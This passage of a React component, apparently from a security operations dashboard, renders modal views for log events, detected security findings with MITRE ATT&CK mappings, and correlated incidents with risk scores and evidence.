              </div>
            </div>
          )}
        </div>
      )}

      {/* EVENT DRILL-DOWN MODAL */}
      {selectedEvent && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-3xl w-full p-6 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <FileCode className="w-5 h-5 text-cyan-400" />
                <h3 className="text-base font-bold text-white">
                  Normalized Event Drilldown ({selectedEvent.event_id})
                </h3>
              </div>
              <button
                onClick={() => setSelectedEvent(null)}
                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 bg-slate-950 p-3.5 rounded-xl border border-slate-800 font-mono">
                <div>
                  <span className="text-[10px] text-slate-500 font-sans block">Timestamp</span>
                  <span className="text-slate-200">{selectedEvent.timestamp}</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 font-sans block">Source Type</span>
                  <span className="text-cyan-400 font-semibold">{selectedEvent.source_type}</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 font-sans block">Source IP</span>
                  <span className="text-amber-300">{selectedEvent.src_ip || 'N/A'}</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 font-sans block">Destination IP</span>
                  <span className="text-slate-200">{selectedEvent.dst_ip || 'N/A'}</span>
                </div>
              </div>

              <div>
                <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block mb-1">
                  Raw Log String:
                </span>
                <div className="bg-slate-950 p-3 rounded-xl border border-slate-800 font-mono text-[11px] text-slate-300 break-all leading-relaxed">
                  {selectedEvent.raw_event}
                </div>
              </div>

              <div>
                <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block mb-1">
                  Normalized Schema JSON:
                </span>
                <pre className="bg-slate-950 p-3 rounded-xl border border-slate-800 font-mono text-[11px] text-cyan-300 overflow-x-auto max-h-60 leading-relaxed">
                  {JSON.stringify(selectedEvent, null, 2)}
                </pre>
              </div>
            </div>

            <div className="flex justify-end pt-2">
              <button
                onClick={() => setSelectedEvent(null)}
                className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold transition"
              >
                Close Drilldown
              </button>
            </div>
          </div>
        </div>
      )}

      {/* FINDING DRILL-DOWN MODAL */}
      {selectedFinding && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-2xl w-full p-6 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <ShieldAlert className="w-5 h-5 text-red-400" />
                <h3 className="text-base font-bold text-white">
                  Security Finding: {selectedFinding.threat_type}
                </h3>
              </div>
              <button
                onClick={() => setSelectedFinding(null)}
                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="flex items-center justify-between p-3 bg-slate-950 rounded-xl border border-slate-800">
                <div>
                  <span className="text-[10px] text-slate-500 block">Detecting Agent</span>
                  <span className="font-bold text-slate-200 text-sm">{selectedFinding.agent}</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 block">Severity</span>
                  <span className="font-bold text-red-400 text-sm">{selectedFinding.severity}</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 block">Confidence</span>
                  <span className="font-bold text-cyan-400 text-sm">
                    {Math.round(selectedFinding.confidence * 100)}%
                  </span>
                </div>
              </div>

              <div>
                <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block mb-1">
                  Description:
                </span>
                <p className="text-slate-300 leading-relaxed bg-slate-950 p-3 rounded-xl border border-slate-800">
                  {selectedFinding.description}
                </p>
              </div>

              {selectedFinding.evidence && selectedFinding.evidence.length > 0 && (
                <div>
                  <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block mb-1">
                    Captured Forensic Evidence:
                  </span>
                  <div className="bg-slate-950 p-3 rounded-xl border border-slate-800 font-mono text-[11px] space-y-1">
                    {selectedFinding.evidence.map((ev, i) => (
                      <div key={i} className="text-slate-300">
                        • {ev}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {selectedFinding.mitre_technique && (
                <div>
                  <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block mb-1">
                    MITRE ATT&CK Technique:
                  </span>
                  <div className="bg-slate-950 p-3 rounded-xl border border-slate-800 text-xs font-mono text-cyan-300 flex items-center justify-between">
                    <span>{selectedFinding.mitre_technique}</span>
                    <span className="text-slate-500 font-sans">{selectedFinding.mitre_tactic}</span>
                  </div>
                </div>
              )}
            </div>

            <div className="flex justify-end pt-2">
              <button
                onClick={() => setSelectedFinding(null)}
                className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold transition"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* INCIDENT DRILL-DOWN MODAL */}
      {selectedIncident && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-3xl w-full p-6 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <Layers className="w-5 h-5 text-cyan-400" />
                <h3 className="text-base font-bold text-white">
                  Correlated Incident: {selectedIncident.title}
                </h3>
              </div>
              <button
                onClick={() => setSelectedIncident(null)}
                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-4 text-xs">
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 bg-slate-950 p-4 rounded-xl border border-slate-800">
                <div>
                  <span className="text-[10px] text-slate-500 block">Incident ID</span>
                  <span className="font-mono font-bold text-cyan-300">{selectedIncident.incident_id}</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 block">Risk Score</span>
                  <span className="font-bold text-red-400 text-sm">
                    {selectedIncident.risk_score}/100
                  </span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 block">Severity</span>
                  <span className="font-bold text-red-400">{selectedIncident.severity}</span>
                </div>
                <div>
                  <span className="text-[10px] text-slate-500 block">Priority</span>
                  <span className="font-bold text-amber-300">{selectedIncident.priority}</span>
                </div>
              </div>

              {selectedIncident.risk_factors && (
                <div className="bg-slate-950 p-3.5 rounded-xl border border-slate-800 space-y-2">
                  <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block">
                    Mathematical Scoring Formula & Weights:
                  </span>
                  <div className="text-[11px] font-mono text-cyan-300 bg-slate-900 p-2.5 rounded border border-slate-800">
                    {selectedIncident.risk_factors.formula_explanation}
                  </div>
                </div>
              )}

              {selectedIncident.evidence && selectedIncident.evidence.length > 0 && (
                <div className="space-y-1">
                  <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block">
                    Evidence Extracted Across Layers:
                  </span>
                  <div className="bg-slate-950 p-3 rounded-xl border border-slate-800 font-mono text-[11px] space-y-1">
                    {selectedIncident.evidence.map((ev, idx) => (
                      <div key={idx} className="text-slate-300">
                        • {ev}
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <div className="flex items-center justify-between pt-2 border-t border-slate-800">
              {onNavigate && (
                <button
                  onClick={() => {
                    setSelectedIncident(null);
                    if (onNavigateToIncident) {
                      onNavigateToIncident(selectedIncident.incident_id);
                    } else {
                      onNavigate('incidents');
                    }
                  }}
                  className="px-4 py-2 rounded-xl bg-red-600 hover:bg-red-500 text-white text-xs font-semibold flex items-center gap-1.5 transition shadow"
                >
                  Open in SOC Incidents <ArrowRight className="w-3.5 h-3.5" />
                </button>
              )}
              <button
                onClick={() => setSelectedIncident(null)}
                className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold transition ml-auto"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
